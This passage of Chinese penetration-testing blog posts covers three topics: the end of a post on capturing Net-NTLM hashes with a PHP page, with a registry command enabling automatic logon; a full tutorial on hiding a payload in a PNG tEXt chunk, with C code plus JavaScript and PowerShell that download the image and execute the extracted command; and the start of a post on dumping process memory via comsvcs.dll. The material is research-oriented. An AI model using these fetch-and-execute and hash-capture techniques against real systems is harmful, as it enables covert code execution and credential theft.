<p>至于<code class="language-plaintext highlighter-rouge">challenge</code>，在脚本中指定为<code class="language-plaintext highlighter-rouge">0x0000000000000000</code>，所以最后拼接hashcat的格式时直接设置为<code class="language-plaintext highlighter-rouge">0x0000000000000000</code>即可</p>

<h2 id="0x05-实际测试">0x05 实际测试</h2>
<hr>

<h3 id="1本地测试">1、本地测试</h3>

<p><strong>Server：</strong></p>

<p>安装apache环境</p>

<p>简单的配置方法:  安装phpstudy</p>

<p>上传脚本catchyournetntlm.php</p>

<p><strong>Client：</strong></p>

<p>修改IE配置文件，将登录方式修改为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code></p>

<p>对应命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /v 1A00 /t REG_DWORD /d 00000000 /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>域环境下不需要这个设置</p>

<p>Client访问服务器上的catchyournetntlm.php，服务器获得用户的Net-NTLM hash，提取出固定格式返回至Client</p>

<p>Client显示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/3-1.png" alt="Alt text"></p>

<p>数据可直接用于hashcat的破解</p>

<h3 id="2在线测试">2、在线测试</h3>

<p>https://evi1cg.me/test.php</p>

<p>服务器使用nginx，未使用apache</p>

<p><strong>注：</strong></p>

<p>nginx下脚本的优化由evilcg完成</p>

<p>Client使用默认登录方法，访问该网址弹出对话框提示输入密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-1.png" alt="Alt text"></p>

<p>任意输入，获得输入内容的Net-NTLM hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-2.png" alt="Alt text"></p>

<p>将Client的登录方式修改为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code>，访问该网址自动获得Client当前用户的Net-NTLM hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-3.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了利用PHP脚本从浏览器中获得Net-NTLM hash的方法，分享脚本编写细节，实际测试该方法的效果。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 10, 2018
  </div>

  
</article><article class="post">
  <h1>隐写技巧——利用PNG文件格式隐藏Payload</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/0.jpg" alt="Alt text"></p>

<blockquote>
  <p>图片来自于http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/</p>
</blockquote>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。</p>

<p><strong>注：</strong></p>

<p>所有程序源码已上传github，地址为：
https://github.com/3gstudent/PNG-Steganography</p>

<h2 id="0x02-png文件格式">0x02 PNG文件格式</h2>
<hr>

<h3 id="1png文件署名域">1、PNG文件署名域</h3>
<p>前8字节</p>

<p>固定格式，16进制为：
<code class="language-plaintext highlighter-rouge">89 50 4e 47 0d 0a 1a 0a </code></p>

<h3 id="2数据块">2、数据块</h3>

<p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>

<p>Chunk Data(数据块数据): 可变长度,存储数据</p>

<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>

<p><strong>数据块类型：</strong></p>

<p><strong>1. 关键数据块(critical chunk)</strong></p>

<p>(1) 文件头数据块IHDR(header chunk)</p>
<ul>
  <li>包含PNG文件的基本信息</li>
  <li>一个PNG数据流中只能有一个IHDR</li>
  <li><strong>必须在PNG文件最前面</strong></li>
</ul>

<p>(2) 调色板数据块PLTE(palette chunk)</p>
<ul>
  <li>包含有与索引彩色图像(indexed-color image)相关的彩色变换数据</li>
  <li><strong>必须在IDAT之前</strong></li>
</ul>

<p>(3) 图像数据块IDAT(image data chunk)</p>
<ul>
  <li>存储实际的数据</li>
  <li>可存在多个</li>
  <li><strong>必须与其他IDAT连续</strong></li>
</ul>

<p>(4) 图像结束数据IEND(image trailer chunk)</p>
<ul>
  <li>固定格式，16进制为：
<code class="language-plaintext highlighter-rouge">00 00 00 00 49 45 4E 44 AE 42 60 82</code></li>
  <li><strong>必须在PNG文件最尾部</strong></li>
</ul>

<p><strong>2. 辅助数据块(ancillary chunk)</strong></p>

<p>用于辅助指示PNG图像中的层、文字等信息</p>

<p><strong>可删除，不影响图片浏览，但图像将失去原来的可编辑性</strong></p>

<p>(1) 背景颜色数据块bKGD(background color)</p>

<p>(2) 基色和白色度数据块cHRM(primary chromaticities and white point)</p>

<p>(3) 图像γ数据块gAMA(image gamma)</p>

<p>(4) 图像直方图数据块hIST(image histogram)</p>

<p>(5) 物理像素尺寸数据块pHYs(physical pixel dimensions)</p>

<p>(6) 样本有效位数据块sBIT(significant bits)</p>

<p>(7) 文本信息数据块tEXt(textual data)</p>

<p>(8) 图像最后修改时间数据块tIME (image last-modification time)</p>

<p>(9) 图像透明数据块tRNS (transparency)</p>

<p>(10) 压缩文本数据块zTXt (compressed textual data)</p>

<h2 id="0x03-实例格式分析">0x03 实例格式分析</h2>
<hr>

<p>工具：<code class="language-plaintext highlighter-rouge">Hex Editor</code></p>

<p><strong>优点：</strong></p>

<p>可对16进制字符串进行标记，设置颜色，方便格式分析</p>

<p><strong>测试文件：</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/test.png" alt="Alt text"></p>

<p><strong>源下载地址：</strong></p>

<p>http://www.easyicon.net/language.en/1172671-png_icon.html</p>

<p>标记好的文件格式如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-1.PNG" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-2.PNG" alt="Alt text"></p>

<h3 id="1-png文件署名域">(1) PNG文件署名域</h3>

<p>固定格式：</p>

<p><code class="language-plaintext highlighter-rouge">89 50 4e 47 0d 0a 1a 0a </code></p>

<h3 id="2-ihdr">(2) IHDR</h3>

<p>00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; ….IHDR……..
00000018h: 08 04 00 00 00 03 43 84 45                      ; ……C凟</p>

<p><strong>数据块结构：</strong></p>

<p><strong>Length:</strong>	
<code class="language-plaintext highlighter-rouge">00 00 00 0D</code></p>

<p>前4字节，定义长度，00 00 00 0D十进制为13，代表长度为13个字节</p>

<p><strong>Chunk Type Code：</strong>		
<code class="language-plaintext highlighter-rouge">49 48 44 52</code></p>

<p>4字节，定义数据块类型码，此处为IHDR</p>

<p><strong>Chunk Data：</strong>
<code class="language-plaintext highlighter-rouge">00 00 00 1A 00 00 00 1A 08 04 00 00 00 </code></p>

<p>共13字节，定义数据内容</p>

<p><strong>CRC：</strong>
4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>

<p>即对以下十六进制作计算：
<code class="language-plaintext highlighter-rouge">49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>

<p>编写程序对CRC算法进行验证，保存为example1.cpp,源代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;string.h&gt;
unsigned int GetCrc32(char* InStr,unsigned int len){        
  unsigned int Crc32Table[256];      
  int i,j;        
  unsigned int Crc;        
  for (i = 0; i &lt; 256; i++){        
	Crc = i;        
	for (j = 0; j &lt; 8; j++){        
	  if (Crc &amp; 1)        
		Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
	  else       
		Crc &gt;&gt;= 1;      
	}        
	Crc32Table[i] = Crc;        
  }        
	
  Crc=0xffffffff;        
  for(int m=0; m&lt;len; m++){          
	Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
  }     
	   
  Crc ^= 0xFFFFFFFF;     
  return Crc;        
}        
int main(int argc, char* argv[])
{
	char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
	unsigned int crc32=GetCrc32(buf,sizeof(buf));
	printf("%08X\n",crc32);
	return 0;
}
</code></pre></div></div>

<p>运行后如图，输出<code class="language-plaintext highlighter-rouge">03438445</code>，同文件中的CRC32校验码相同</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-3.png" alt="Alt text"></p>

<h3 id="3-gama">(3) gAMA</h3>

<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ….gAMA..睆.黙.</p>

<p><strong>数据块结构：</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 04</code></p>

<p>Chunk Type Code：	<code class="language-plaintext highlighter-rouge">67 41 4D 41</code></p>

<p>Chunk Data：		<code class="language-plaintext highlighter-rouge">00 00 B1 8F</code></p>

<p>CRC：				<code class="language-plaintext highlighter-rouge">0B FC 61 05</code></p>

<h3 id="4-chrm">(4) cHRM</h3>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; … cHRM..z&amp;..€?
00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘
00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C             ; ..:?..p満Q&lt;</p>

<p><strong>数据块结构：</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 20</code></p>

<p>Chunk Type Code：	<code class="language-plaintext highlighter-rouge">63 48 52 4D</code></p>

<p>Chunk Data：			<code class="language-plaintext highlighter-rouge">00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70</code></p>

<p>CRC：				<code class="language-plaintext highlighter-rouge">9C BA 51 3C</code></p>

<h3 id="5-idat">(5) IDAT</h3>

<p>(6-14) tEXt</p>

<p>(15)IEND</p>

<p><strong>数据块结构：</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 00</code></p>

<p>Chunk Type Code：	<code class="language-plaintext highlighter-rouge">49 45 4E 44</code></p>

<p>Chunk Data：</p>

<p>CRC：				<code class="language-plaintext highlighter-rouge">AE 42 60 82</code></p>

<p>固定结构，CRC的值为对Chunk Type Code作CRC32校验</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-4.png" alt="Alt text"></p>

<h2 id="0x04-编写程序分析文件格式">0x04 编写程序分析文件格式</h2>
<hr>
<p>开发工具：<code class="language-plaintext highlighter-rouge">vc6.0</code></p>

<h3 id="1读取png文件">1、读取PNG文件</h3>

<p>保存为example2.cpp，代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
int main(int argc, char* argv[])
{
	FILE *fp;   
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	int len=ftell(fp);
	unsigned char *buf=new unsigned char[len];	
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("len=%d\n",len);
	for(int i=1;i&lt;=len;i++)
	{
		printf("%02X ",buf[i-1]);
		if(i%16==0)
			printf("\n");
	}
	fclose(fp);
	printf("\n");
	return 0;	
}
</code></pre></div></div>

<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-5.PNG" alt="Alt text"></p>

<h3 id="2解析数据块结构">2、解析数据块结构</h3>

<p>从第8字节开始，读前四字节为ChunkLength</p>

<p>对应的代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
</code></pre></div></div>

<p>接着四字节为ChunkName</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("ChunkName:%c%c%c%c\n",buf[0],buf[1],buf[2],buf[3]);
</code></pre></div></div>

<p>然后根据ChunkLength读出完整的ChunkData</p>

<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>

<p>保存为check.cpp,完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0;
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0;
	while(1)
	{
		i++;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
			printf("Palette Chunk\n");
		printf("Ancillary Chunk\n");
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		ChunkOffset+=ChunkLen+12;
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
			printf("Check Success!\n\n");
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fclose(fp);
	return 0;	
}
</code></pre></div></div>

<p>运行如图，可获得完整的PNG文件结构</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-6.PNG" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-7.PNG" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>

<p>后续会补充python的实现代码</p>

<h2 id="0x05-去除多余数据">0x05 去除多余数据</h2>
<hr>
<p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>

<h3 id="1工具实现">1、工具实现</h3>

<p>如图，使用<code class="language-plaintext highlighter-rouge">Hex Editor</code>去除辅助数据块gAMA、cHRM和bKGD</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-8.PNG" alt="Alt text"></p>

<p>如图，文件大小变化，但不影响PNG文件浏览</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-9.png" alt="Alt text"></p>

<h3 id="2程序实现">2、程序实现</h3>

<p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>

<p>保存为compress.cpp,完整代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\0.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
</code></pre></div></div>

<p>如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-10.png" alt="Alt text"></p>

<h2 id="0x06-写入payload">0x06 写入Payload</h2>
<hr>
<p><strong>实例：</strong></p>

<p>按照辅助数据块的格式写入Payload</p>

<p>写入的Payload为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>calc.exe
</code></pre></div></div>

<p>辅助数据块设置为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tEXt
</code></pre></div></div>

<p>对应的完整数据块结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Length:				00 00 00 08
Chunk Type Code：	74 45 58 74
Chunk Data：			63 61 6c 63 2e 65 78 65
CRC：				fa c4 08 76
</code></pre></div></div>

<p>写入的十六进制数据如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76
</code></pre></div></div>

<p><strong>注：</strong>
本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>

<h3 id="1工具实现-1">1、工具实现</h3>

<p>使用<code class="language-plaintext highlighter-rouge">Hex Editor</code>插入数据，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-11.PNG" alt="Alt text"></p>

<p>保存后，不影响PNG文件浏览</p>

<h3 id="2程序实现-1">2、程序实现</h3>

<p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>

<p>保存为addpayload.cpp,完整代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

void convertStrToUnChar(char* str, unsigned char* UnChar)  
{  
	int i = strlen(str), j = 0, counter = 0;  
	char c[2];  
	unsigned int bytes[2];  
  
	for (j = 0; j &lt; i; j += 2)   
	{  
		if(0 == j % 2)  
		{  
			c[0] = str[j];  
			c[1] = str[j + 1];  
			sscanf(c, "%02x" , &amp;bytes[0]);  
			UnChar[counter] = bytes[0];  
			counter++;  
		}  
	}  
	return;  
}     

void AddPayload(FILE *fp)
{
	char *Payload="calc.exe";
	unsigned char *buf;
	int len;
	int crc32;
	len=strlen(Payload);	
	buf=new unsigned char[len+12];
	buf[0]=len&gt;&gt;24&amp;0xff;
	buf[1]=len&gt;&gt;16&amp;0xff;
	buf[2]=len&gt;&gt;8&amp;0xff;
	buf[3]=len&amp;0xff;
	buf[4]='t';
	buf[5]='E';
	buf[6]='X';
	buf[7]='t';
	for(int j=0;j&lt;len;j++)
		buf[j+8]=Payload[j];
	buf[len+8]=0XFA;
	buf[len+9]=0XC4;
	buf[len+10]=0X08;
	buf[len+11]=0X76;
	fwrite(buf,len+12,1,fp);
}

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	AddPayload(fpnew);
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
</code></pre></div></div>

<p>使用check.cpp对其进行校验，如图，校验成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-12.PNG" alt="Alt text"></p>

<h2 id="0x07-读取payload并执行">0x07 读取payload并执行</h2>
<hr>
<p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>

<h3 id="1javascript">1、javascript</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.SetTimeouts(0, 0, 0, 0);
h.Open("GET","https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png",false);
h.Send();
Data = h.ResponseText;
x=Data.indexOf("tEXt");
y=Data.indexOf("IEND");
str=Data.substring(x+4,y-8);
new ActiveXObject("WScript.Shell").Run(str); 
</code></pre></div></div>

<h3 id="2powershell">2、powershell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$url = 'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'
$request = New-Object System.Net.WebCLient
$bytes = $request.DownloadString($url)
$x=$bytes.indexof("tEXt")
$y=$bytes.indexof("IEND")
$str=$bytes.Substring($x+4,$y-$x-12)
Start-Process -FilePath $str
</code></pre></div></div>

<p><strong>注:</strong></p>

<p>这里给出两种方法，仅作演示</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>
<p>本文详细介绍分析了PNG文件的格式，编写程序实现以下功能：</p>

<ul>
  <li>
    <p>自动解析PNG文件格式，辅助查找其中的隐藏内容</p>
  </li>
  <li>
    <p>添加Payload</p>
  </li>
  <li>
    <p>下载PNG图片解析并执行payload</p>
  </li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 15, 2016
  </div>

  
</article><article class="post">
  <h1>《MiniDumpWriteDump via COM+ Services DLL》的利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近学习了odzhan文章中介绍的一个技巧，使用C:\windows\system32\comsvcs.dll的导出函数MiniDump能够dump指定进程的内存文件。</p>

<p>文章地址：</p>

<p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>

<p>本文将要结合自己的经验，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数，查看是否存在其他可用的dll，介绍脚本实现的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
